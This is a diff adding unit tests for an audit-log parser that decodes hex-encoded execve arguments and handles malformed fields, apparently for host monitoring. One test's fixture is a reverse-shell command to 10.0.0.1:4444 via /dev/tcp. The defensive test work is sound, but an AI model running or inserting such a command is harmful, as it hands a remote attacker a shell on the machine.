@@ -35,3 +35,37 @@ def test_parse_event_builds_hostevent():
 def test_parse_event_ignores_non_execve():
     line = 'type=SYSCALL msg=audit(1700000000.123:9): syscall=2 pid=5 uid=0 comm="cat"'
     assert parse_event([line]) is None
+
+
+def test_hex_encoded_execve_arg_is_decoded():
+    payload = "sh >& /dev/tcp/10.0.0.1/4444 0>&1"
+    syscall = 'type=SYSCALL msg=audit(1700000000.1:1): syscall=59 pid=5 uid=0 comm="sh" exe="/bin/sh"'
+    execve = f'type=EXECVE msg=audit(1700000000.1:1): argc=3 a0="sh" a1="-c" a2={payload.encode().hex()}'
+    ev = parse_event([syscall, execve])
+    assert ev["args"] == ["sh", "-c", payload]
+
+
+def test_quoted_hexlike_arg_stays_literal():
+    syscall = 'type=SYSCALL msg=audit(1.1:1): syscall=59 pid=1 uid=0 comm="x" exe="/x"'
+    execve = 'type=EXECVE msg=audit(1.1:1): argc=1 a0="deadbeef"'
+    ev = parse_event([syscall, execve])
+    assert ev["args"] == ["deadbeef"]
+
+
+def test_hex_encoded_comm_is_decoded():
+    weird = "ev il"
+    syscall = f'type=SYSCALL msg=audit(1.1:1): syscall=59 pid=1 uid=0 comm={weird.encode().hex()} exe="/x"'
+    ev = parse_event([syscall])
+    assert ev["comm"] == weird
+
+
+def test_malformed_pid_uid_does_not_crash():
+    syscall = 'type=SYSCALL msg=audit(1.1:1): syscall=59 pid=abc uid=xyz comm="x" exe="/x"'
+    ev = parse_event([syscall])
+    assert ev["pid"] == 0 and ev["uid"] == 0
+
+
+def test_unparseable_timestamp_is_empty_not_fabricated():
+    syscall = 'type=SYSCALL msg=audit(BROKEN): syscall=59 pid=1 uid=0 comm="x" exe="/x"'
+    ev = parse_event([syscall])
+    assert ev["timestamp"] == ""
